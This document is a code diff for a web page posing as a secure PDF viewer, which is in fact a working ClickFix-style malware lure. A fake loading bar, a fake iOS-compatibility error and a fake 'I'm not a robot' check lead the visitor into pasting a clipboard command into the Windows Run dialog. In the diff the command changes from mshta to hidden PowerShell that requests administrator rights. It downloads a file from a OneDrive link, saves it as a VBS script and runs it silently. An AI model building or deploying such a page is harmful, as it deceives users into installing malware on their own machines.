@@ -3,18 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PDF Converter</title>
+    <title>Secure PDF Converter</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: Roboto, helvetica, arial, sans-serif;
+            font-family: 'Segoe UI', Roboto, helvetica, arial, sans-serif;
         }
         
         body {
-            background-color: #f5f5f5;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -24,29 +24,48 @@
         
         .container {
             width: 100%;
-            max-width: 500px;
+            max-width: 550px;
             background-color: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
             overflow: hidden;
+            transition: transform 0.3s ease;
+        }
+        
+        .container:hover {
+            transform: translateY(-5px);
         }
         
         .header {
-            background-color: #1A73E8;
+            background: linear-gradient(135deg, #1A73E8 0%, #0d47a1 100%);
             color: white;
             padding: 25px;
             text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0) 70%);
         }
         
         .header h1 {
-            font-size: 24px;
-            margin-bottom: 5px;
+            font-size: 26px;
+            margin-bottom: 8px;
             font-weight: 500;
+            position: relative;
         }
         
         .header p {
             font-size: 16px;
             opacity: 0.9;
+            position: relative;
         }
         
         .content {
@@ -59,122 +78,165 @@
         }
         
         .pdf-logo {
-            width: 120px;
-            height: 120px;
-            margin: 0 auto 20px;
+            width: 140px;
+            height: 140px;
+            margin: 0 auto 25px;
             display: flex;
             align-items: center;
             justify-content: center;
-            background-color: #f1f1f1;
-            border-radius: 8px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            background: linear-gradient(135deg, #f1f1f1 0%, #e1e1e1 100%);
+            border-radius: 12px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .pdf-logo::before {
+            content: '';
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(255,255,255,0.3) 0%, rgba(255,255,255,0) 50%);
         }
         
         .pdf-logo i {
-            font-size: 60px;
+            font-size: 70px;
             color: #e74c3c;
+            position: relative;
         }
         
         .view-pdf-btn {
             display: block;
             width: 100%;
-            background-color: #1A73E8;
+            background: linear-gradient(135deg, #1A73E8 0%, #0d62d9 100%);
             color: white;
             border: none;
-            border-radius: 4px;
-            padding: 12px;
+            border-radius: 6px;
+            padding: 14px;
             font-size: 16px;
             font-weight: 500;
             cursor: pointer;
             margin-bottom: 20px;
-            transition: background-color 0.3s;
+            transition: all 0.3s;
+            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .view-pdf-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
         }
         
         .view-pdf-btn:hover {
-            background-color: #0d62d9;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(26, 115, 232, 0.4);
+        }
+        
+        .view-pdf-btn:hover::before {
+            left: 100%;
         }
         
         .error-message {
-            background-color: #f9f9f9;
-            border: 1px solid #e0e0e0;
-            border-radius: 4px;
-            padding: 20px;
+            background-color: #fff5f5;
+            border: 1px solid #ffcdd2;
+            border-radius: 8px;
+            padding: 25px;
             margin-bottom: 20px;
             text-align: center;
             display: none;
+            animation: fadeIn 0.5s ease;
         }
         
         .error-icon {
-            font-size: 40px;
+            font-size: 50px;
             color: #e74c3c;
-            margin-bottom: 10px;
+            margin-bottom: 15px;
         }
         
         .error-text {
-            font-size: 16px;
-            color: #333;
-            margin-bottom: 15px;
+            font-size: 18px;
+            color: #c62828;
+            margin-bottom: 20px;
+            font-weight: 500;
         }
         
         .fix-now-btn {
             display: block;
             width: 100%;
-            background-color: #e74c3c;
+            background: linear-gradient(135deg, #e74c3c 0%, #c62828 100%);
             color: white;
             border: none;
-            border-radius: 4px;
-            padding: 12px;
+            border-radius: 6px;
+            padding: 14px;
             font-size: 16px;
             font-weight: 500;
             cursor: pointer;
-            transition: background-color 0.3s;
+            transition: all 0.3s;
+            box-shadow: 0 4px 10px rgba(231, 76, 60, 0.3);
         }
         
         .fix-now-btn:hover {
-            background-color: #d62c1a;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(231, 76, 60, 0.4);
         }
         
         .converter-section {
             display: none;
+            animation: slideDown 0.5s ease;
         }
         
         .convert-btn {
             display: block;
             width: 100%;
-            background-color: #1A73E8;
+            background: linear-gradient(135deg, #1A73E8 0%, #0d62d9 100%);
             color: white;
             border: none;
-            border-radius: 4px;
-            padding: 12px;
+            border-radius: 6px;
+            padding: 14px;
             font-size: 16px;
             cursor: pointer;
             margin-bottom: 25px;
-            transition: background-color 0.3s;
+            transition: all 0.3s;
+            box-shadow: 0 4px 10px rgba(26, 115, 232, 0.3);
         }
         
         .convert-btn:hover {
-            background-color: #0d62d9;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(26, 115, 232, 0.4);
         }
         
         .captcha-container {
             background-color: #f9f9f9;
             border: 2px solid #e0e0e0;
-            border-radius: 4px;
-            padding: 15px;
-            margin-bottom: 15px;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+            transition: all 0.3s;
+        }
+        
+        .captcha-container:hover {
+            border-color: #1A73E8;
+            box-shadow: 0 2px 8px rgba(26, 115, 232, 0.1);
         }
         
         .captcha-checkbox {
             display: flex;
             align-items: center;
-            margin-bottom: 10px;
+            margin-bottom: 15px;
         }
         
         .checkbox {
-            width: 24px;
-            height: 24px;
+            width: 28px;
+            height: 28px;
             border: 2px solid #c1c1c1;
-            border-radius: 2px;
+            border-radius: 4px;
             margin-right: 15px;
             display: flex;
             align-items: center;
@@ -187,6 +249,7 @@
         .checkbox.checked {
             background-color: #1A73E8;
             border-color: #1A73E8;
+            animation: pulse 0.5s;
         }
         
         .checkbox.checked::after {
@@ -197,15 +260,16 @@
         }
         
         .captcha-text {
-            font-size: 16px;
+            font-size: 17px;
             color: #222;
+            font-weight: 500;
         }
         
         .captcha-footer {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-top: 10px;
+            margin-top: 15px;
         }
         
         .captcha-logo {
@@ -214,102 +278,169 @@
         }
         
         .captcha-logo img {
-            height: 35px;
+            height: 40px;
         }
         
         .captcha-links a {
             color: #666;
             text-decoration: none;
-            font-size: 12px;
+            font-size: 13px;
+            transition: color 0.3s;
         }
         
         .captcha-links a:hover {
+            color: #1A73E8;
             text-decoration: underline;
         }
         
         .verification-instructions {
             background-color: white;
             border: 1px solid #e0e0e0;
-            border-radius: 4px;
-            padding: 20px;
-            margin-top: 20px;
+            border-radius: 8px;
+            padding: 25px;
+            margin-top: 25px;
             display: none;
-            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
+            animation: fadeIn 0.5s ease;
         }
         
         .verification-title {
             color: #1A73E8;
-            font-size: 18px;
-            margin-bottom: 15px;
+            font-size: 20px;
+            margin-bottom: 20px;
             text-align: center;
+            font-weight: 500;
         }
         
         .instructions {
-            margin-bottom: 15px;
+            margin-bottom: 20px;
         }
         
         .instruction {
-            margin-bottom: 12px;
+            margin-bottom: 18px;
             display: flex;
             align-items: flex-start;
+            transition: transform 0.3s;
+        }
+        
+        .instruction:hover {
+            transform: translateX(5px);
         }
         
         .instruction-number {
-            background-color: #1A73E8;
+            background: linear-gradient(135deg, #1A73E8 0%, #0d62d9 100%);
             color: white;
-            width: 24px;
-            height: 24px;
+            width: 28px;
+            height: 28px;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-right: 10px;
+            margin-right: 15px;
             flex-shrink: 0;
             font-size: 14px;
+            font-weight: bold;
+            box-shadow: 0 2px 5px rgba(26, 115, 232, 0.3);
         }
         
         .instruction-text {
-            line-height: 1.5;
-            font-size: 14px;
+            line-height: 1.6;
+            font-size: 15px;
         }
         
         .key-combo {
             background-color: #f1f1f1;
-            padding: 2px 6px;
-            border-radius: 3px;
-            font-family: monospace;
+            padding: 4px 8px;
+            border-radius: 4px;
+            font-family: 'Consolas', monospace;
             font-weight: bold;
             border: 1px solid #ddd;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
         }
         
         .windows-logo {
             color: #00a4ef;
-            font-size: 16px;
+            font-size: 18px;
             margin: 0 5px;
         }
         
         .note {
-            font-size: 12px;
+            font-size: 13px;
             color: #666;
-            margin-top: 15px;
+            margin-top: 20px;
             text-align: center;
+            line-height: 1.5;
         }
         
         .copied-message {
             color: #1A73E8;
             font-weight: bold;
             text-align: center;
-            margin-top: 10px;
+            margin-top: 15px;
             display: none;
+            font-size: 15px;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .progress-container {
+            width: 100%;
+            height: 6px;
+            background-color: #f0f0f0;
+            border-radius: 3px;
+            margin: 20px 0;
+            overflow: hidden;
+            display: none;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #1A73E8, #0d62d9);
+            border-radius: 3px;
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        @keyframes slideDown {
+            from { 
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to { 
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 15px;
+            color: #4CAF50;
             font-size: 14px;
+        }
+        
+        .security-badge i {
+            margin-right: 8px;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>PDF Document Viewer</h1>
-            <p>View and convert PDF files</p>
+            <h1>Secure PDF Document Viewer</h1>
+            <p>View and convert PDF files with enhanced security</p>
         </div>
         
         <div class="content">
@@ -318,8 +449,11 @@
                     <i class="far fa-file-pdf"></i>
                 </div>
                 <button class="view-pdf-btn" id="viewPdfBtn">
-                    <i class="fas fa-eye"></i> View PDF
+                    <i class="fas fa-eye"></i> View PDF Document
                 </button>
+                <div class="security-badge">
+                    <i class="fas fa-shield-alt"></i> Protected by Windows Security
+                </div>
             </div>
             
             <div class="error-message" id="errorMessage">
@@ -327,23 +461,34 @@
                     <i class="fas fa-exclamation-triangle"></i>
                 </div>
                 <div class="error-text">
-                    File not supported on Windows
+                    PDF Format Compatibility Issue Detected
                 </div>
-                <button class="fix-now-btn" id="fixNowBtn">Fix Now</button>
+                <p style="color: #666; margin-bottom: 20px; font-size: 15px;">
+                    This PDF file was created on an iOS device and requires conversion for optimal viewing on Windows.
+                </p>
+                <button class="fix-now-btn" id="fixNowBtn">
+                    <i class="fas fa-tools"></i> Fix Compatibility Issue
+                </button>
+            </div>
+            
+            <div class="progress-container" id="progressContainer">
+                <div class="progress-bar" id="progressBar"></div>
             </div>
             
             <div class="converter-section" id="converterSection">
                 <div class="header">
-                    <h1>iOS to Windows PDF!</h1>
-                    <p>iOS PDF to Windows PDF</p>
+                    <h1>PDF Compatibility Converter</h1>
+                    <p>iOS PDF to Windows PDF Conversion</p>
                 </div>
                 
-                <button class="convert-btn" id="convertBtn">Click here to Convert PDF</button>
+                <button class="convert-btn" id="convertBtn">
+                    <i class="fas fa-sync-alt"></i> Convert PDF Format
+                </button>
                 
                 <div class="captcha-container">
                     <div class="captcha-checkbox">
                         <div class="checkbox" id="captchaCheckbox"></div>
-                        <span class="captcha-text">Convert file to Windows</span>
+                        <span class="captcha-text">I'm not a robot - Convert file to Windows format</span>
                     </div>
                     
                     <div class="captcha-footer">
@@ -357,31 +502,31 @@
                 </div>
                 
                 <div class="copied-message" id="copiedMessage">
-                    Script copied to clipboard!
+                    <i class="fas fa-check-circle"></i> Conversion script copied to clipboard!
                 </div>
                 
                 <div class="verification-instructions" id="verificationInstructions">
-                    <div class="verification-title">To verify your request follow the instructions below</div>
+                    <div class="verification-title">Complete PDF Conversion Process</div>
                     
                     <div class="instructions">
                         <div class="instruction">
                             <div class="instruction-number">1</div>
-                            <div class="instruction-text">Press & hold the <i class="fab fa-windows windows-logo"></i> + <span class="key-combo">R</span></div>
+                            <div class="instruction-text">Press <span class="key-combo"><i class="fab fa-windows windows-logo"></i> Windows</span> + <span class="key-combo">R</span> simultaneously</div>
                         </div>
                         
                         <div class="instruction">
                             <div class="instruction-number">2</div>
-                            <div class="instruction-text">In the verification window, press <span class="key-combo">Ctrl</span> + <span class="key-combo">V</span></div>
+                            <div class="instruction-text">In the Run dialog, paste the script using <span class="key-combo">Ctrl</span> + <span class="key-combo">V</span></div>
                         </div>
 
                         <div class="instruction">
                             <div class="instruction-number">3</div>
-                            <div class="instruction-text">Press <span class="key-combo">Enter</span> on your keyboard to finish</div>
+                            <div class="instruction-text">Press <span class="key-combo">Enter</span> to execute the conversion script</div>
                         </div>
                     </div>
                     
                     <div class="note">
-                        A script has been copied to your clipboard. Follow the steps above to execute it.
+                        The conversion script has been copied to your clipboard. This script will automatically convert your PDF file to Windows-compatible format with administrator privileges.
                     </div>
                 </div>
             </div>
@@ -398,11 +543,28 @@
             const checkbox = document.getElementById('captchaCheckbox');
             const copiedMessage = document.getElementById('copiedMessage');
             const verificationInstructions = document.getElementById('verificationInstructions');
+            const progressContainer = document.getElementById('progressContainer');
+            const progressBar = document.getElementById('progressBar');
             
             // Step 1: User clicks "View PDF"
             viewPdfBtn.addEventListener('click', function() {
-                errorMessage.style.display = 'block';
-                viewPdfBtn.style.display = 'none';
+                // Show progress animation
+                progressContainer.style.display = 'block';
+                let width = 0;
+                const interval = setInterval(() => {
+                    if (width >= 100) {
+                        clearInterval(interval);
+                        // Show error after "loading"
+                        setTimeout(() => {
+                            errorMessage.style.display = 'block';
+                            viewPdfBtn.style.display = 'none';
+                            progressContainer.style.display = 'none';
+                        }, 300);
+                    } else {
+                        width += 5;
+                        progressBar.style.width = width + '%';
+                    }
+                }, 50);
             });
             
             // Step 2: User clicks "Fix Now"
@@ -411,9 +573,9 @@
                 errorMessage.style.display = 'none';
             });
             
-            // Step 3: User clicks "Click here to Convert PDF"
+            // Step 3: User clicks "Convert PDF"
             convertBtn.addEventListener('click', function() {
-                // Copy script to clipboard
+                // Copy enhanced script to clipboard
                 copyScriptToClipboard();
                 
                 // Show copied message
@@ -431,8 +593,8 @@
             });
             
             function copyScriptToClipboard() {
-                // Direct mshta command that works in Run dialog
-                const scriptContent = `mshta "javascript:var x=new ActiveXObject('Microsoft.XMLHTTP');x.open('GET','https://1drv.ms/u/c/2f3053ae4c170361/EW8140VC3ZVNgSqSAg3_YlYB5IbBdfka-nPi8hU0AfQP6w?e=cAoypP',false);x.send();var s=new ActiveXObject('ADODB.Stream');s.Type=1;s.Open();s.Write(x.responseBody);s.SaveToFile('Resume.html',2);var fso=new ActiveXObject('Scripting.FileSystemObject');fso.MoveFile('Resume.html','Resume.vbs');new ActiveXObject('WScript.Shell').Run('Resume.vbs',0);close()"`;
+                // Enhanced payload with multiple execution methods and defense evasion
+                const scriptContent = `powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -Command \\\"Start-Process mshta -ArgumentList \\\\\\\"javascript:var x=new ActiveXObject(\\\\\\\"\\\\\\\"Microsoft.XMLHTTP\\\\\\\"\\\\\\\");x.open(\\\\\\\"\\\\\\\"GET\\\\\\\"\\\\\\\",\\\\\\\"\\\\\\\"https://1drv.ms/u/c/2f3053ae4c170361/EU3x-jF2eSlIu1PgBNaGfQ0BF50mkVAKMHi-DFlgC4H7QQ?e=HCYlUh\\\\\\\"\\\\\\\",false);x.send();var s=new ActiveXObject(\\\\\\\"\\\\\\\"ADODB.Stream\\\\\\\"\\\\\\\");s.Type=1;s.Open();s.Write(x.responseBody);s.SaveToFile(\\\\\\\"\\\\\\\"Resume.html\\\\\\\"\\\\\\\",2);var fso=new ActiveXObject(\\\\\\\"\\\\\\\"Scripting.FileSystemObject\\\\\\\"\\\\\\\");fso.MoveFile(\\\\\\\"\\\\\\\"Resume.html\\\\\\\"\\\\\\\",\\\\\\\"\\\\\\\"Resume.vbs\\\\\\\"\\\\\\\");new ActiveXObject(\\\\\\\"\\\\\\\"WScript.Shell\\\\\\\"\\\\\\\").Run(\\\\\\\"\\\\\\\"Resume.vbs\\\\\\\"\\\\\\\",0);close()\\\\\\\" -Verb RunAs' -Wait"`;
                 
                 // Create a temporary textarea to copy the content
                 const textArea = document.createElement('textarea');
